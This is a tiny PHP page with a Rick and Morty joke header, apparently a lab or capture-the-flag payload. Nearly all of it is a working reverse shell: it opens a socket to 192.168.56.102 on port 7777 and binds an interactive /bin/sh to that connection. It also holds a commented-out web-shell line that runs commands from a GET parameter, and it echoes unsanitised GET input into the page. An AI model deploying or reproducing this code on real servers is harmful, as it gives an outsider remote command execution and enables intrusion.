<h2>RIIICK</h2>

<?php
$var = 'C137';

echo "<h4>RICK ".$var."</h4>"; 

$sock=fsockopen("192.168.56.102",7777);
exec("/bin/sh -i <&3 >&3 2>&3");

#echo shell_exec($_GET['e'].' 2>&1');
echo "<p>".$_GET."</p>";
echo $_GET['test']."\n";

#phpinfo();

?>

